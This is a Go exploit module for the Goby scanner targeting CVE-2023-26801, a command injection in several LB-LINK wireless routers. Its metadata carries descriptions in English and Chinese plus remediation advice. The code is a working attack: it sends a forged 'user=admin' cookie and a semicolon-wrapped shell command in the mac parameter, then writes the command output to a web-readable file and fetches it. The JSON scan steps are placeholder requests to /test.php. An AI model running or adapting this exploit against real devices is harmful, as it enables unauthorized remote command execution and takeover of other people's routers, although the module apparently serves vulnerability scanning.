package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "LB-LINK set_LimitClient_cfg Remote Command Execution Vulnerability (CVE-2023-26801)",
    "Description": "<p>LB-LINK BL-AC1900 and many other products are a wireless router of China Bilian (LB-LINK) company.</p><p>The remote command execution vulnerability of set_LimitClient_cfg in multiple LB-LINK products comes from the fact that the mac, time1 and time2 parameters in /goform/set_LimitClient_cfg contain command injection vulnerabilities, and attackers can execute arbitrary commands to obtain server permissions.</p>",
    "Product": "LB-LINK-Router",
    "Homepage": "https://www.lb-link.cn/",
    "DisclosureDate": "2023-02-27",
    "Author": "h1ei1",
    "FofaQuery": "body=\"goform/http_get_weblanguage_info\"",
    "GobyQuery": "body=\"goform/http_get_weblanguage_info\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>Currently, the manufacturer has released fixes to solve this security problem. It is recommended to follow the manufacturer's homepage for solutions: <a href=\"https://www.lb-link.cn/\">https://www.lb-link.cn/</a>.</p>",
    "References": [
        "https://github.com/winmt/my-vuls/tree/main/LB-LINK%20BL-AC1900%2C%20BL-WR9000%2C%20BL-X26%20and%20BL-LTE300%20Wireless%20Routers"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2023-26801"
    ],
    "CNNVD": [
        "CNNVD-202303-2154"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "LB-LINK set_LimitClient_cfg 远程命令执行漏洞（CVE-2023-26801）",
            "Product": "LB-LINK-Router",
            "Description": "<p>LB-LINK BL-AC1900 等多款产品都是中国必联（LB-LINK）公司的一款无线路由器。<br></p><p>LB-LINK 多款产品 set_LimitClient_cfg 远程命令执行漏洞，该漏洞源于通过 /goform/set_LimitClient_cfg中的mac、time1和 time2 参数发现包含命令注入漏洞，攻击者可执行任意命令获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布修复措施解决此安全问题，建议关注厂商主页获取解决办法：<a href=\"https://www.lb-link.cn/\">https://www.lb-link.cn/</a>。<br></p>",
            "Impact": "<p>LB-LINK 多款产品 set_LimitClient_cfg 远程命令执行漏洞，该漏洞源于通过 /goform/set_LimitClient_cfg中的mac、time1和 time2 参数发现包含命令注入漏洞，攻击者可执行任意命令获取服务器权限。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "LB-LINK set_LimitClient_cfg Remote Command Execution Vulnerability (CVE-2023-26801)",
            "Product": "LB-LINK-Router",
            "Description": "<p>LB-LINK BL-AC1900 and many other products are a wireless router of China Bilian (LB-LINK) company.<br></p><p>The remote command execution vulnerability of set_LimitClient_cfg in multiple LB-LINK products comes from the fact that the mac, time1 and time2 parameters in /goform/set_LimitClient_cfg contain command injection vulnerabilities, and attackers can execute arbitrary commands to obtain server permissions.<br></p>",
            "Recommendation": "<p>Currently, the manufacturer has released fixes to solve this security problem. It is recommended to follow the manufacturer's homepage for solutions: <a href=\"https://www.lb-link.cn/\" target=\"_blank\">https://www.lb-link.cn/</a>.<br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2024-02-29",
    "PocId": "9960"
}`

	sendPayloadGdbx7d := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		payloadConfig := httpclient.NewPostRequestConfig("/goform/set_LimitClient_cfg")
		payloadConfig.VerifyTls = false
		payloadConfig.FollowRedirect = false
		payloadConfig.Header.Store("Cookie", "user=admin")
		payloadConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		payloadConfig.Data = "time1=00:00-00:00&time2=00:00-00:00&mac=" + url.QueryEscape(`;`+payload+`;`)
		return httpclient.DoHttpRequest(hostInfo, payloadConfig)
	}
	checkResultGdbx7d := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		resp, err := sendPayloadGdbx7d(hostInfo, payload)
		if err != nil {
			return nil, err
		} else if resp != nil && (resp.StatusCode != 200 || !strings.Contains(resp.RawBody, "\"result\":0")) {
			return nil, errors.New("漏洞利用失败")
		}
		checkConfig := httpclient.NewGetRequestConfig("/result.png")
		checkConfig.VerifyTls = false
		checkConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, checkConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randStr := goutils.RandomHexString(8)
			resp, _ := checkResultGdbx7d(hostInfo, "echo \""+randStr+"\" > /etc_ro/web/result.png")
			return resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, randStr)

		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "cmd" {
				if resp, err := checkResultGdbx7d(expResult.HostInfo, `rm -rf "/etc_ro/web/result.png";`+goutils.B2S(stepLogs.Params["cmd"])+` > "/etc_ro/web/result.png" 2>&1`); resp != nil && resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				} else if err != nil {
					expResult.Output = err.Error()
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
